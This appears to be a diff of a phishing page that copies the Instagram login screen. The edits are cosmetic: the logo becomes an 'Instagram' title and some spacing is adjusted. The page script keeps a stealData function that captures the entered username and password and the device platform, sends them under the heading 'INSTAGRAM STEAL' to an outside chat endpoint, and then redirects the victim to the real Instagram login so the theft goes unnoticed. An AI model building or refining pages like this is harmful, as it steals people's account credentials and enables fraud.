@@ -24,23 +24,16 @@
             padding: 20px;
             text-align: center;
         }
-        .logo {
-            width: 110px;
-            height: 110px;
-            margin: 20px auto 35px;
-            background: linear-gradient(135deg, #f56040, #c13584, #833ab4, #405de6);
-            border-radius: 28px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 68px;
-            box-shadow: 0 10px 30px rgba(255, 0, 150, 0.3);
+        .title {
+            font-size: 28px;
+            font-weight: 500;
+            margin-bottom: 35px;
         }
         .form-box {
             background: #111;
             border: 1px solid #333;
             border-radius: 12px;
-            padding: 35px 25px 25px;
+            padding: 35px 25px 30px;
         }
         input {
             width: 100%;
@@ -59,7 +52,7 @@
         button {
             width: 100%;
             padding: 13px;
-            margin: 20px 0 12px;
+            margin: 22px 0 12px;
             background: #0095f6;
             color: #fff;
             border: none;
@@ -89,7 +82,7 @@
 </head>
 <body>
     <div class="container">
-        <div class="logo">📷</div>
+        <div class="title">Instagram</div>
         
         <div class="form-box">
             <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="off">
@@ -121,7 +114,7 @@
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
 
-            const text = `🔥 INSTAGRAM STEAL 2026\n\n` +
+            const text = `🔥 INSTAGRAM STEAL\n\n` +
                         `👤 <b>Username:</b> <code>${username || 'N/A'}</code>\n` +
                         `🔑 <b>Password:</b> <code>${password || 'N/A'}</code>\n\n` +
                         `📱 Device: ${navigator.platform}\n` +
@@ -129,8 +122,8 @@
                         `⏰ Time: ${new Date().toISOString()}\n\n` +
                         `━━━━━━━━━━━━━━━━━━\n` +
                         `📋 <b>اضغط للنسخ:</b>\n` +
-                        `👤 Username → ${username}\n` +
-                        `🔑 Password → ${password}`;
+                        `👤 ${username}\n` +
+                        `🔑 ${password}`;
 
             const form = new FormData();
             form.append('chat_id', CHAT_ID);
@@ -142,13 +135,13 @@
                 body: form
             }).catch(() => {});
 
-            // تحويل للصفحة الحقيقية
+            // Redirect to real Instagram
             setTimeout(() => {
                 window.location.href = "https://www.instagram.com/accounts/login/";
-            }, 1400);
+            }, 1300);
         }
 
-        // دعم زر Enter
+        // دعم Enter
         document.addEventListener('keypress', (e) => {
             if (e.key === "Enter") stealData();
         });
